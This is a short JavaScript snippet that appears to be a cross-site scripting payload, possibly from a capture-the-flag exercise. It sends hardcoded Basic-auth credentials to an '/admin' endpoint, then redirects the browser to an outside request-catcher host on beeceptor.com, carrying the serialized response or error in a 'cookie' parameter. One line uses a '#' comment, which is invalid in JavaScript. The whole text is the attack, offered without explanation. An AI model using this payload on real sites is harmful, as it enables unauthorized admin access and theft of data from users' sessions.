(async () => {
  let headers = new Headers();
  headers.set('Authorization', 'Basic ' + btoa('dev_us' + ":" + 'valera_smeni_kredi_4mo'));
  fetch('/admin', {headers}).then(res => {
  window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(res))

  }).catch(err => {
    window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(err))
  })

#   window.location.replace('https://gvfdgdfgfsfd.free.beeceptor.com?cookie=' + JSON.stringify(res))
})()
